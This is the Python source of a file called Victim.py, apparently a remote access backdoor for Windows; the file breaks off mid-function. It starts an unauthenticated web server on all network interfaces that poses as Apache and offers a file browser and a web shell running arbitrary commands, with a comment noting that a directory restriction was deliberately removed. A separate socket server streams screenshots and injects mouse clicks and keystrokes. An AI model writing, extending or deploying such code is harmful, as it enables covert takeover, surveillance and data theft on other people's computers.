# --- START OF FILE Victim.py (Integrated with WebServer + Debug Fixes) ---

import os
import socket
import subprocess
import time
import base64
import signal
import sys
import ctypes
import requests
# --- Imports needed for integrated Web Server ---
import http.server
import socketserver
import urllib.parse
import html
import io
import json
from datetime import datetime
import shutil # Already imported, but needed by WebServer part too
from http import HTTPStatus # Already imported, but needed by WebServer part too
import traceback # <--- ADDED for detailed error logging
# --- End Web Server Imports ---
import threading
import pyautogui
import struct
import platform
import sqlite3
import random
from connection_manager import ConnectionManager # Import the manager

pyautogui.FAILSAFE = False

# Server configuration
HOST = '0.0.0.0'  # Listen on all available interfaces
CMD_PORT = 5555       # Port for screen share commands
MGMT_PORT = CMD_PORT + 1 # Port for Connection Manager interface
HTTP_PORT = 8080      # Port for the integrated Web Server (Shell + Files)
MAX_CONNECTIONS = 5  # Maximum number of simultaneous screen share connections

# --- Path Setup ---
# Get the path to the Documents folder
documents_path = os.path.expanduser('~\\Documents')
# Define the working folder name
folder_name = "VictimTest"
# Create the full path to the working folder
VICTIM_WORK_DIR = os.path.join(documents_path, folder_name)
# Create the folder if it doesn't exist
if not os.path.exists(VICTIM_WORK_DIR):
    try:
        os.makedirs(VICTIM_WORK_DIR)
        print(f"Created directory: {VICTIM_WORK_DIR}")
    except Exception as e:
        print(f"Error creating directory {VICTIM_WORK_DIR}: {e}")
        sys.exit(f"Fatal: Could not create working directory {VICTIM_WORK_DIR}")
# Change the working directory to the new folder globally for the script
try:
    os.chdir(VICTIM_WORK_DIR)
    print(f"[GLOBAL CWD] Set to: {os.getcwd()}")
except Exception as e:
     print(f"Error setting global CWD to {VICTIM_WORK_DIR}: {e}")
     sys.exit(f"Fatal: Could not change to working directory {VICTIM_WORK_DIR}")

# --- Web Server Root Directory (should match CWD after chdir) ---
WEB_SERVER_ROOT = os.getcwd()
# --- Initial Shell Directory (set explicitly to avoid ambiguity) ---
INITIAL_SHELL_CWD = os.getcwd()


# Set up screen resolution (keep as before)
try:
    screen_width, screen_height = pyautogui.size()
    print(f"Screen resolution: {screen_width}x{screen_height}")
except Exception as e:
    print(f"Warning: Could not get screen resolution via pyautogui: {e}")
    screen_width, screen_height = 800, 600 # Default fallback

# --- Helper Functions (from WebServer.py) ---
def format_size(size_bytes):
    """Format file size in human-readable format"""
    if size_bytes is None: return "N/A"
    if size_bytes < 1024:
        return f"{size_bytes} B"
    elif size_bytes < 1024 * 1024:
        return f"{size_bytes / 1024:.1f} KB"
    elif size_bytes < 1024 * 1024 * 1024:
        return f"{size_bytes / (1024 * 1024):.1f} MB"
    else:
        return f"{size_bytes / (1024 * 1024 * 1024):.1f} GB"

# --- Custom Request Handler (from WebServer.py + Debug Fixes) ---
class WebServerRequestHandler(http.server.SimpleHTTPRequestHandler):
    """Custom handler to add shell execution and manage CWD for the shell."""

    shell_current_directory = INITIAL_SHELL_CWD
    server_root = WEB_SERVER_ROOT
    server_version = "Apache/2.4.54 (Win64)"
    sys_version = ""

    # --- translate_path Override with Logging ---
    def translate_path(self, path):
        """Translate a /-separated PATH to the local filename syntax with logging."""
        print(f"\n--- [translate_path START] Input path: {path} ---")
        # abandon query parameters
        path = path.split('?',1)[0]
        path = path.split('#',1)[0]
        # Don't forget explicit decoding from path to strings!
        try:
            # Handle potential % encoded characters
            decoded_path = urllib.parse.unquote(path, errors='strict') # Be strict initially
        except UnicodeDecodeError:
            print(f"[translate_path WARNING] Failed strict decoding, trying latin-1 fallback for: {path}")
            # Fallback encoding if needed, be careful with this
            decoded_path = urllib.parse.unquote(path, encoding='latin-1', errors='replace')

        # STARTING POINT: Use the server_root directly
        base_path = os.path.abspath(self.server_root)
        print(f"[translate_path] Base path (server_root): {base_path}")

        # Prevent escaping upwards using '../'
        # Normalize separators and collapse '..' initially
        # Treat paths starting with '/' or '\' as relative to the base_path before normpath
        if decoded_path.startswith('/') or decoded_path.startswith('\\'):
            norm_input_path = decoded_path.lstrip('/\\')
        else:
            norm_input_path = decoded_path

        # Normpath removes trailing slashes and collapses intermediate '.'/'..' where possible
        norm_decoded_path = os.path.normpath(norm_input_path)
        print(f"[translate_path] Normalized component path: {norm_decoded_path}")


        # Join with base path safely - norm_decoded_path should now be relative
        requested_path = os.path.join(base_path, norm_decoded_path)
        print(f"[translate_path] Initial joined path: {requested_path}")

        # Final check: Ensure the final path is still within the base_path AFTER full resolution
        final_abs_path = os.path.abspath(requested_path)
        print(f"[translate_path] Final absolute path candidate: {final_abs_path}")

        # Check if the final resolved path starts with the intended base path
        # Add os.sep at the end of base_path for stricter check (prevents matching "/root/abc" with "/root/a")
        if not final_abs_path.startswith(base_path + os.sep) and final_abs_path != base_path:
             print(f"[translate_path DENIED] Path traversal attempt or invalid path: '{final_abs_path}' is outside '{base_path}'")
             # Return a path guaranteed to cause 404 within the root
             result_path = os.path.join(base_path, "___ACCESS_DENIED_404___")
        else:
            print(f"[translate_path ALLOWED] Final path: {final_abs_path}")
            result_path = final_abs_path

        print(f"--- [translate_path END] Returning: {result_path} ---")
        return result_path

    # --- _send_headers with Logging ---
    def _send_headers(self, status_code, content_type="text/html; charset=utf-8", extra_headers=None):
        """Helper to send common headers with logging."""
        print(f"\n--- [_send_headers START] Status: {status_code}, Content-Type: {content_type} ---")
        try:
            self.send_response(status_code)
            print(f"[_send_headers] Sent response code: {status_code}")
            self.send_header("Content-type", content_type)
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            if extra_headers:
                for key, value in extra_headers.items():
                    self.send_header(key, value)
                    print(f"[_send_headers] Sent extra header: {key}={value}")
            self.send_header('Server', self.server_version)
            self.send_header('Date', self.date_time_string())
            print(f"[_send_headers] Sent standard headers.")
            self.end_headers()
            print(f"--- [_send_headers END] Headers finished. ---")
        except Exception as e:
            print(f"--- [!!! _send_headers ERROR !!!] ---")
            traceback.print_exc()
            print(f"--- [!!! END _send_headers ERROR !!!] ---")
            # Re-raise or handle? If end_headers fails, connection is likely broken.


    def _serve_shell_html(self):
        """Serves the HTML page for the web shell."""
        print("[_serve_shell_html] Generating shell HTML")
        current_shell_path = WebServerRequestHandler.shell_current_directory
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Web Shell</title>
            {self._get_common_styles()}
        </head>
        <body>
            <div class="container">
                <h2>Web Shell</h2>
                <div class="path-display">Current Path: <span id="currentPath">{html.escape(current_shell_path)}</span></div>
                <form id="shell-form" method="POST" action="/execute">
                    <input type="text" name="command" id="command-input" placeholder="Enter command..." autofocus>
                    <button type="submit">Execute</button>
                </form>
                <h3>Output:</h3>
                <pre id="output">[Output will appear here]</pre>
                <a href="/" id="file-browser-link">Return to File Browser</a>
            </div>
            {self._get_shell_script()}
        </body>
        </html>
        """
        try:
            encoded_html = html_content.encode('utf-8')
            self._send_headers(HTTPStatus.OK) # Use OK status code
            print("[_serve_shell_html] Headers sent. Writing HTML content.")
            self.wfile.write(encoded_html)
            print("[_serve_shell_html] Finished writing HTML content.")
        except Exception as e:
            print(f"--- [!!! _serve_shell_html ERROR !!!] ---")
            traceback.print_exc()
            print(f"--- [!!! END _serve_shell_html ERROR !!!] ---")

    def _execute_command(self, command):
        """Executes a shell command for the web shell and returns output and new CWD."""
        print(f"[_execute_command] Executing: '{command}' in CWD: {WebServerRequestHandler.shell_current_directory}")
        output = ""
        current_shell_dir = WebServerRequestHandler.shell_current_directory
        new_shell_dir = current_shell_dir # Default to current if no change
        try:
            if command.strip().startswith("cd"):
                new_dir_part = command.strip()[len("cd"):].strip()
                # Strip quotes if present
                if len(new_dir_part) > 1 and new_dir_part.startswith('"') and new_dir_part.endswith('"'): new_dir_part = new_dir_part[1:-1]
                elif len(new_dir_part) > 1 and new_dir_part.startswith("'") and new_dir_part.endswith("'"): new_dir_part = new_dir_part[1:-1]

                if not new_dir_part:
                     # Handle 'cd' with no arguments (print current dir)
                     output = f"Current directory: {current_shell_dir}\n"
                else:
                    # Calculate the absolute target path based on the *current* shell directory
                    target_path = os.path.abspath(os.path.join(current_shell_dir, new_dir_part))
                    print(f"[_execute_command cd] Target path calculation: {target_path}")

                    # --- !!! SECURITY WARNING !!! ---
                    # The following boundary check has been REMOVED.
                    # This allows the web shell 'cd' command to navigate
                    # anywhere on the filesystem accessible by the process.
                    # This significantly increases security risks.
                    # --- START REMOVED/COMMENTED BLOCK ---
                    # abs_initial_shell_cwd = os.path.abspath(INITIAL_SHELL_CWD)
                    # print(f"[_execute_command cd] Initial shell CWD (for reference): {abs_initial_shell_cwd}")
                    # # Check if the target path is outside the initial allowed directory
                    # if not target_path.startswith(abs_initial_shell_cwd + os.sep) and target_path != abs_initial_shell_cwd:
                    #     output = f"Error: Cannot 'cd' outside initial directory ({INITIAL_SHELL_CWD}).\n"
                    #     print(f"[_execute_command cd] Denied CD outside initial boundary.")
                    # --- END REMOVED/COMMENTED BLOCK ---

                    # Check if the calculated target path is a valid directory
                    if os.path.isdir(target_path):
                        # Update the class variable holding the shell's CWD
                        WebServerRequestHandler.shell_current_directory = target_path
                        new_shell_dir = target_path # Update the directory to be returned in JSON
                        output = f"Changed directory to: {new_shell_dir}\n"
                        print(f"[_execute_command cd] Directory changed successfully to: {new_shell_dir}")
                    else:
                        # Target path is not a valid directory
                        output = f"Error: Directory not found or not a directory: {target_path}\n"
                        print(f"[_execute_command cd] Target path not a valid directory.")
            else:
                # --- Execute other commands using subprocess ---
                print(f"[_execute_command subprocess] Running command in: {current_shell_dir}")
                # Use the current_shell_dir (which might have been changed by 'cd')
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True,
                    errors='ignore', cwd=current_shell_dir, timeout=30 # Use the potentially changed CWD
                )
                print(f"[_execute_command subprocess] Return code: {result.returncode}")
                output = result.stdout + result.stderr
                if not output.strip() and result.returncode == 0:
                     output = f"[+] Command '{command}' executed successfully (no output).\n"
                elif result.returncode != 0:
                     output += f"\n[!] Command exited with code {result.returncode}.\n"

        except subprocess.TimeoutExpired:
            output = f"Error: Command '{command}' timed out after 30 seconds.\n"
            print(f"[_execute_command] Command timed out.")
        except Exception as e:
            output = f"Error executing command '{command}': {str(e)}\n"
            print(f"--- [!!! _execute_command ERROR !!!] ---")
            traceback.print_exc()
            print(f"--- [!!! END _execute_command ERROR !!!] ---")

        # Return the output and the potentially updated CWD for the web shell
        result_data = {"output": output, "cwd": new_shell_dir}
        print(f"[_execute_command] Returning: {result_data}")
        return result_data

    # --- do_GET with Logging ---
    def do_GET(self):
        """Handle GET requests with detailed logging and error handling."""
        print(f"\n--- [WEB SERVER do_GET START] Path: {self.path} From: {self.client_address} ---")
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            query = parsed_path.query
            print(f"[WEB SERVER GET] Parsed Path='{path}', Query='{query}'")

            if path == '/shell':
                print("[WEB SERVER GET] Routing to /shell")
                self._serve_shell_html()
                print("[WEB SERVER GET] Finished serving /shell")
                return
            elif path == '/favicon.ico':
                 print("[WEB SERVER GET] Serving 404 for /favicon.ico")
                 self.send_error(HTTPStatus.NOT_FOUND, "File not found")
                 return
            elif path == '/execute':
                 print("[WEB SERVER GET] Routing to /execute via GET")
                 params = urllib.parse.parse_qs(query)
                 command = params.get('command', [None])[0]
                 if command:
                      result = self._execute_command(command)
                      print("[WEB SERVER GET] Sending /execute result (JSON)")
                      self._send_headers(HTTPStatus.OK, content_type="application/json")
                      self.wfile.write(json.dumps(result).encode('utf-8'))
                 else:
                      print("[WEB SERVER GET] Sending 400 for /execute (missing command)")
                      self.send_error(HTTPStatus.BAD_REQUEST, "Missing 'command' parameter")
                 return

            # --- Default file/directory handling ---
            print("[WEB SERVER GET] Handling as file/directory request")
            # Call translate_path explicitly first to see resolved path
            fs_path = self.translate_path(self.path)
            print(f"[WEB SERVER GET] Translated path: {fs_path}")

            # Handle the fake path returned by translate_path on access denial
            if fs_path.endswith("___ACCESS_DENIED_404___"):
                 print("[WEB SERVER GET] Sending 403 Forbidden due to translate_path denial.")
                 self.send_error(HTTPStatus.FORBIDDEN, "Access denied")
                 return

            if os.path.isdir(fs_path):
                 print(f"[WEB SERVER GET] Path is directory: {fs_path}. Calling list_directory.")
                 # Call our overridden list_directory directly
                 self.list_directory(fs_path)
                 print(f"[WEB SERVER GET] Finished list_directory for: {fs_path}")
            else:
                # Serve the file using base class logic (which uses translate_path again internally,
                # but we've logged our translation already)
                print(f"[WEB SERVER GET] Path is file: {fs_path}. Calling super().do_GET() -> send_head()")
                # super().do_GET() essentially calls send_head() then copyfile()
                # We can replicate the relevant parts or call super()
                # Calling super() might be simpler if base class logic is desired
                # Let's try calling super() first.
                super().do_GET()
                # Note: super().do_GET() calls translate_path again. We log it above already.
                # It then calls send_head() which tries to open the file.
                # If send_head() succeeds, it calls copyfile().
                print("[WEB SERVER GET] super().do_GET() finished or errored out.")

        except ConnectionAbortedError:
            print("[WEB SERVER GET] Connection aborted by client.")
        except BrokenPipeError:
            print("[WEB SERVER GET] Broken pipe (client likely closed connection).")
        except socket.timeout:
             print("[WEB SERVER GET] Socket timeout during request.")
        except Exception as e:
            print(f"--- [!!! WEB SERVER do_GET ERROR !!!] Path: {self.path} ---")
            traceback.print_exc()
            try:
                # Attempt to send a 500 error only if headers haven't been sent
                # This is tricky to determine reliably. Assume if we got here, they likely weren't.
                if not self.headers_sent: # Simple check (might not be foolproof)
                    print("[WEB SERVER GET] Attempting to send 500 error response.")
                    self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, f"Internal Server Error")
                else:
                     print("[WEB SERVER GET] Headers likely already sent, cannot send 500 error.")
            except Exception as e_send:
                 print(f"[WEB SERVER GET] Additionally failed to send 500 error response: {e_send}")
            print(f"--- [!!! END WEB SERVER do_GET ERROR !!!] ---")
        finally:
             print(f"--- [WEB SERVER do_GET END] Path: {self.path} ---")

    def do_POST(self):
        """Handle POST requests, specifically for shell commands."""
        print(f"\n--- [WEB SERVER do_POST START] Path: {self.path} From: {self.client_address} ---")
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            print(f"[WEB SERVER POST] Parsed Path='{path}'")

            if path == '/execute':
                print("[WEB SERVER POST] Routing to /execute")
                content_length = int(self.headers.get('Content-Length', 0))
                print(f"[WEB SERVER POST] Content-Length: {content_length}")
                if content_length > 10 * 1024: # Limit command length
                    print("[WEB SERVER POST] Command too long, sending 413.")
                    self.send_error(HTTPStatus.REQUEST_ENTITY_TOO_LARGE, "Command too long")
                    return

                post_data_bytes = self.rfile.read(content_length)
                # Log post data carefully - could be large or sensitive
                print(f"[WEB SERVER POST] Read {len(post_data_bytes)} bytes.")
                try:
                     post_data_str = post_data_bytes.decode('utf-8')
                     print(f"[WEB SERVER POST] Decoded POST data: {post_data_str[:200]}...") # Log truncated
                except UnicodeDecodeError:
                     print("[WEB SERVER POST] Failed to decode POST data as UTF-8, using ignore.")
                     post_data_str = post_data_bytes.decode('utf-8', errors='ignore')


                params = urllib.parse.parse_qs(post_data_str)
                command = params.get('command', [None])[0]
                print(f"[WEB SERVER POST] Parsed command: {command}")

                if command:
                    result = self._execute_command(command)
                    print("[WEB SERVER POST] Sending /execute result (JSON)")
                    self._send_headers(HTTPStatus.OK, content_type="application/json")
                    self.wfile.write(json.dumps(result).encode('utf-8'))
                else:
                    print("[WEB SERVER POST] Missing command, sending 400.")
                    self._send_headers(HTTPStatus.BAD_REQUEST, content_type="application/json")
                    self.wfile.write(b'{"error": "Missing command"}')
                return

            # Handle other POST requests
            print(f"[WEB SERVER POST] Path '{path}' not allowed for POST, sending 405.")
            self.send_error(HTTPStatus.METHOD_NOT_ALLOWED, "Method Not Allowed")

        except socket.timeout:
             print("[WEB SERVER POST] Socket timeout during request.")
        except Exception as e:
            print(f"--- [!!! WEB SERVER do_POST ERROR !!!] Path: {self.path} ---")
            traceback.print_exc()
            try:
                 if not self.headers_sent:
                     print("[WEB SERVER POST] Attempting to send 500 error response.")
                     self.send_error(HTTPStatus.INTERNAL_SERVER_ERROR, "Internal Server Error")
                 else:
                     print("[WEB SERVER POST] Headers likely already sent, cannot send 500 error.")
            except Exception as e_send:
                print(f"[WEB SERVER POST] Additionally failed to send 500 error response: {e_send}")
            print(f"--- [!!! END WEB SERVER do_POST ERROR !!!] ---")
        finally:
            print(f"--- [WEB SERVER do_POST END] Path: {self.path} ---")


    # --- list_directory override with Logging ---
    def list_directory(self, path):
        """Generate HTML for a directory listing with logging and boundary check."""
        print(f"\n--- [list_directory START] Generating listing for path: {path} ---")
        f = None # Ensure f exists for finally block
        try:
            abs_requested_path = os.path.abspath(path)
            abs_server_root = os.path.abspath(self.server_root)
            print(f"[list_directory] Absolute requested path: {abs_requested_path}")
            print(f"[list_directory] Absolute server root: {abs_server_root}")

            # Check boundaries (redundant if translate_path works, but good defense-in-depth)
            if not abs_requested_path.startswith(abs_server_root + os.sep) and abs_requested_path != abs_server_root:
                 print(f"[list_directory DENIED] Path outside server root: '{abs_requested_path}'")
                 self.send_error(HTTPStatus.FORBIDDEN, "Access denied: Path outside server root.")
                 return None

            print("[list_directory] Attempting os.listdir()")
            list_dir = os.listdir(path)
            print(f"[list_directory] Found {len(list_dir)} items.")
            list_dir.sort(key=lambda a: a.lower())

            # --- HTML Generation ---
            f = io.BytesIO()
            rel_display_path = os.path.relpath(abs_requested_path, abs_server_root)
            web_display_path = '/' if rel_display_path == '.' else '/' + rel_display_path.replace(os.path.sep, '/')
            if not web_display_path.endswith('/'): web_display_path += '/'
            escaped_display_path = html.escape(web_display_path, quote=False)
            print(f"[list_directory] Calculated web display path: {web_display_path}")

            f.write(b'<!DOCTYPE html>\n')
            f.write(b'<html>\n<head>\n')
            f.write(b'<meta http-equiv="Content-Type" content="text/html; charset=utf-8">\n')
            f.write(f'<title>Directory listing for {escaped_display_path}</title>\n'.encode('utf-8'))
            f.write(self._get_common_styles().encode('utf-8')) # Use helper for styles
            f.write(b'</head>\n<body>\n')
            f.write(f'<h2>Directory listing for {escaped_display_path}</h2>\n'.encode('utf-8'))
            f.write(b'<a href="/shell" class="shell-link">Go to Web Shell</a><hr>\n')
            f.write(b'<table>\n')
            f.write(b'<tr><th>Name</th><th>Size</th><th>Modified</th></tr>\n')

            # Add ".." link if not at the server root
            if abs_requested_path != abs_server_root:
                # Calculate parent web path carefully
                parent_web_path = urllib.parse.urljoin(web_display_path, '..')
                parent_web_path = urllib.parse.urlunparse(urllib.parse.urlparse(parent_web_path)._replace(path=os.path.normpath(urllib.parse.urlparse(parent_web_path).path).replace('\\', '/')))
                if not parent_web_path.endswith('/'): parent_web_path += '/'
                print(f"[list_directory] Adding parent link to: {parent_web_path}")
                f.write(b'<tr><td><a href="%s">.. (Parent Directory)</a></td><td>-</td><td>-</td></tr>\n' % urllib.parse.quote(parent_web_path).encode('utf-8'))

            # List directory contents
            for name in list_dir:
                fullname = os.path.join(path, name)
                displayname = linkname = name
                item_web_path = urllib.parse.quote(name)
                is_dir = os.path.isdir(fullname)
                size_str, mod_time_str = "-", "-"
                if is_dir:
                    displayname += "/"
                    linkname += "/"
                    item_web_path += '/'
                else:
                    try:
                        stat_result = os.stat(fullname)
                        size_str = format_size(stat_result.st_size)
                        mod_time_str = datetime.fromtimestamp(stat_result.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                    except OSError as stat_e:
                        print(f"[list_directory WARNING] os.stat failed for '{fullname}': {stat_e}")
                        size_str = "N/A"
                        mod_time_str = "N/A"
                f.write(b'<tr>')
                f.write(b'<td><a href="%s">%s</a></td>' % (item_web_path.encode('utf-8'), html.escape(displayname).encode('utf-8')))
                f.write(b'<td>%s</td>' % size_str.encode('utf-8'))
                f.write(b'<td>%s</td>' % mod_time_str.encode('utf-8'))
                f.write(b'</tr>\n')

            f.write(b'</table>\n<hr></body>\n</html>\n')
            print(f"[list_directory] Finished generating HTML in buffer.")

            length = f.tell()
            f.seek(0)

            print(f"[list_directory] Attempting to send headers (Content-Length: {length}).")
            self._send_headers(HTTPStatus.OK, extra_headers={"Content-Length": str(length)})
            print(f"[list_directory] Headers sent. Attempting to copy file object.")
            shutil.copyfileobj(f, self.wfile)
            print(f"[list_directory] Finished sending directory listing for: {path}")

        except OSError as list_e:
             print(f"[list_directory ERROR] OSError accessing path '{path}': {list_e}")
             # Check if headers already sent before sending error
             if not self.headers_sent:
                  self.send_error(HTTPStatus.NOT_FOUND, "Cannot list directory")
             else:
                  print("[list_directory ERROR] Headers already sent, cannot send 404.")
             return None
        except ConnectionAbortedError:
            print("[list_directory] Connection aborted by client during listing.")
        except BrokenPipeError:
            print("[list_directory] Broken pipe (client closed connection) during listing.")
        except Exception as e:
            print(f"--- [!!! list_directory ERROR !!!] Path: {path} ---")
            traceback.print_exc()
            # Cannot reliably send an error here if headers might have been partially sent
            print(f"--- [!!! END list_directory ERROR !!!] ---")
        finally:
            if f: f.close() # Ensure buffer is closed
            print(f"--- [list_directory END] Path: {path} ---")
        return None # Base class expects None

    # --- Helper for common HTML elements ---
    def _get_common_styles(self):
        return """
            <style>
                body { font-family: sans-serif; background-color: #f0f0f0; margin: 20px; }
                .container { background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
                #output {
                    white-space: pre-wrap; word-wrap: break-word; background-color: #1e1e1e;
                    color: #d4d4d4; padding: 15px; border-radius: 4px; min-height: 200px;
                    max-height: 500px; overflow-y: auto; font-family: monospace; margin-top: 15px;
                }
                input[type="text"] {
                    width: calc(100% - 90px); padding: 8px; margin-right: 5px;
                    border: 1px solid #ccc; border-radius: 4px;
                }
                button {
                    padding: 8px 15px; background-color: #007bff; color: white;
                    border: none; border-radius: 4px; cursor: pointer;
                }
                button:hover { background-color: #0056b3; }
                .path-display { margin-bottom: 10px; font-style: italic; color: #555; }
                #file-browser-link { display: block; margin-top: 15px; }
                /* Styles for list_directory */
                table { border-collapse: collapse; width: 80%; margin-top: 15px; }
                th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
                th { background-color: #f2f2f2; }
                a { text-decoration: none; color: #007bff; }
                a:hover { text-decoration: underline; }
                .shell-link { margin-top: 20px; display: block; font-size: 1.1em; }
            </style>
        """

    def _get_shell_script(self):
        return """
            <script>
                const form = document.getElementById('shell-form');
                const input = document.getElementById('command-input');
                const outputArea = document.getElementById('output');
                const pathDisplay = document.getElementById('currentPath');

                form.addEventListener('submit', async (event) => {
                    event.preventDefault();
                    const command = input.value;
                    input.value = '';
                    outputArea.textContent += `\\n> ${command}\\n`;
                    outputArea.scrollTop = outputArea.scrollHeight;

                    try {
                        const response = await fetch('/execute', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                            body: `command=${encodeURIComponent(command)}`
                        });
                        if (!response.ok) {
                            throw new Error(`HTTP error! status: ${response.status}`);
                        }
                        const result = await response.json();
                        outputArea.textContent += result.output;
                        pathDisplay.textContent = result.cwd;
                        outputArea.scrollTop = outputArea.scrollHeight;
                    } catch (error) {
                        outputArea.textContent += `\\nError: ${error.message}`;
                        outputArea.scrollTop = outputArea.scrollHeight;
                    }
                });
            </script>
        """

    # --- Override log_message to reduce default verbosity ---
    def log_message(self, format, *args):
        # Suppress default logging unless needed
        # print(f"[WebServer Log] {format % args}") # Uncomment for base class logs
        pass

    # --- Add headers_sent property check ---
    @property
    def headers_sent(self):
        return self._headers_buffer is None or not self._headers_buffer


# --- ThreadingHTTPServer Definition ---
class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    pass


# --- Screen Share Client Handling (handle_client - unchanged) ---
def capture_screen():
    """Capture the screen and return compressed image bytes"""
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='JPEG', quality=50)
        return img_byte_arr.getvalue()
    except Exception as e:
        print(f"[SCREEN CAPTURE ERROR] {e}")
        return None

def handle_client(conn, addr, connection_manager):
    """Handle individual client connection for SCREEN SHARE commands."""
    print(f"[SCREEN SHARE][NEW CONNECTION] {addr} connected.")
    client_id = connection_manager.register_connection(conn, addr)
    try:
        while True:
            try:
                command_bytes = conn.recv(1024)
                if not command_bytes:
                    print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) closed connection (no data).")
                    break
                command = command_bytes.decode('utf-8', errors='ignore').strip()
                if not command: continue
            except ConnectionResetError:
                print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) reset connection.")
                break
            except socket.timeout:
                 print(f"[SCREEN SHARE][TIMEOUT] {addr} (ID: {client_id}) timed out waiting for command.")
                 continue
            except socket.error as e:
                 print(f"[SCREEN SHARE][ERROR] Socket error receiving from {addr} (ID: {client_id}): {e}")
                 break
            except Exception as e:
                 print(f"[SCREEN SHARE][ERROR] Unexpected error receiving from {addr} (ID: {client_id}): {e}")
                 break

            connection_manager.update_activity(client_id)

            if command.startswith('SCREEN'):
                img_bytes = capture_screen()
                if img_bytes:
                    try:
                        size_prefix = struct.pack('>L', len(img_bytes))
                        conn.sendall(size_prefix)
                        conn.sendall(img_bytes)
                    except socket.error as e:
                         print(f"[SCREEN SHARE][ERROR] Socket error sending frame to {addr} (ID: {client_id}): {e}")
                         break
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error sending frame to {addr} (ID: {client_id}): {e}")
                         break
                else:
                    try:
                        print(f"[SCREEN SHARE][WARNING] Screen capture failed, sending size 0 to {client_id}")
                        conn.sendall(struct.pack('>L', 0))
                    except socket.error as e:
                         print(f"[SCREEN SHARE][ERROR] Socket error sending size 0 to {addr} (ID: {client_id}): {e}")
                         break
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error sending size 0 to {addr} (ID: {client_id}): {e}")
                         break

            elif command.startswith('MOUSE'):
                parts = command.split('|')
                if len(parts) >= 4:
                    try:
                        x = int(parts[1])
                        y = int(parts[2])
                        action = parts[3]
                        x = max(0, min(x, screen_width))
                        y = max(0, min(y, screen_height))
                        if action == 'click': pyautogui.click(x, y)
                        elif action == 'right_click': pyautogui.rightClick(x, y)
                        elif action == 'double_click': pyautogui.doubleClick(x, y)
                    except ValueError:
                         print(f"[SCREEN SHARE][WARNING] Invalid coordinate format in MOUSE command from {client_id}: {command}")
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error processing MOUSE command from {client_id}: {e}")

            elif command.startswith('KEY'):
                parts = command.split('|')
                if len(parts) >= 2:
                    key_input = parts[1]
                    try:
                        if key_input.lower().startswith('special:'):
                            special_key = key_input[len('special:'):].strip().lower()
                            if special_key in pyautogui.KEYBOARD_KEYS:
                                pyautogui.press(special_key)
                            else:
                                print(f"[SCREEN SHARE][WARNING] Unknown special key '{special_key}' from {client_id}")
                        else:
                            pyautogui.write(key_input, interval=0.01)
                    except Exception as e:
                         print(f"[SCREEN SHARE][ERROR] Error processing KEY command from {client_id}: {e}")

            elif command.upper() == 'CLOSE_STREAM':
                 print(f"[SCREEN SHARE][INFO] Received CLOSE_STREAM from {addr} (ID: {client_id}). Closing.")
                 break
            else:
                 print(f"[SCREEN SHARE][WARNING] Received unknown command from {addr} (ID: {client_id}): {command}")

    except Exception as e:
        print(f"[SCREEN SHARE][ERROR] Unhandled exception in handle_client for {addr} (ID: {client_id}): {e}")
    finally:
        connection_manager.unregister_connection(client_id)
        if conn:
            try: conn.close()
            except Exception: pass
        print(f"[SCREEN SHARE][DISCONNECTED] {addr} (ID: {client_id}) disconnected.")


# --- Combined Server Startup (MODIFIED with Debug Fixes) ---
def start_combined_server():
    """Start combined server: Screen Share Commands + Integrated Web Server"""
    servers = []
    server_threads = []
    connection_manager = ConnectionManager(HOST, MGMT_PORT)
    connection_manager.start()

    cmd_server = None
    httpd = None

    try:
        # --- Create and bind Command Server (Screen Share) ---
        try:
            cmd_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cmd_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            cmd_server.bind((HOST, CMD_PORT))
            cmd_server.listen(MAX_CONNECTIONS)
            servers.append((cmd_server, "Screen Share Command Server"))
            print(f"[LISTENING] Screen Share Command Server on {HOST}:{CMD_PORT}")
        except Exception as e:
            print(f"[ERROR] Failed to bind/listen on command port {CMD_PORT}: {e}")
            cmd_server = None

        # --- Create and bind INTEGRATED Web Server (Shell + Files) ---
        try:
            httpd = ThreadingHTTPServer((HOST, HTTP_PORT), WebServerRequestHandler)
            servers.append((httpd, "Integrated Web Server"))
            print(f"[LISTENING] Integrated Web Server (Shell/Files) on {HOST}:{HTTP_PORT}")
            print(f"[Web Server] Serving files relative to: {WEB_SERVER_ROOT}")
            print(f"[Web Server] Initial shell CWD set to: {INITIAL_SHELL_CWD}")
        except OSError as e:
            if e.errno == 98 or e.errno == 10048: # Address already in use (Linux/Windows)
                print(f"[ERROR] HTTP Port {HTTP_PORT} is already in use.")
            elif e.errno == 13 or e.errno == 10013: # Permission denied (Linux/Windows)
                 print(f"[ERROR] Permission denied binding to HTTP Port {HTTP_PORT}. Try a higher port (>1024) or run as admin (not recommended).")
            else:
                 print(f"[ERROR] Failed to bind/listen on HTTP port {HTTP_PORT}: {e}")
            httpd = None
        except Exception as e:
            print(f"[ERROR] Failed to start Integrated Web Server on HTTP port {HTTP_PORT}: {e}")
            httpd = None

        # --- Start server threads (Worker function with Debug Fixes) ---
        for server_instance, name in servers:
            if server_instance is None:
                 print(f"[WARNING] Skipping thread start for failed server: {name}")
                 continue

            # --- Server Worker Function (inner definition) ---
            def server_worker(s, server_name):
                thread_name = f"{server_name} Worker"
                print(f"[*] Starting worker thread: {thread_name}...")
                try:
                    if isinstance(s, ThreadingHTTPServer):
                        addr = s.server_address
                        print(f"[{thread_name}] Starting serve_forever on {addr}...")
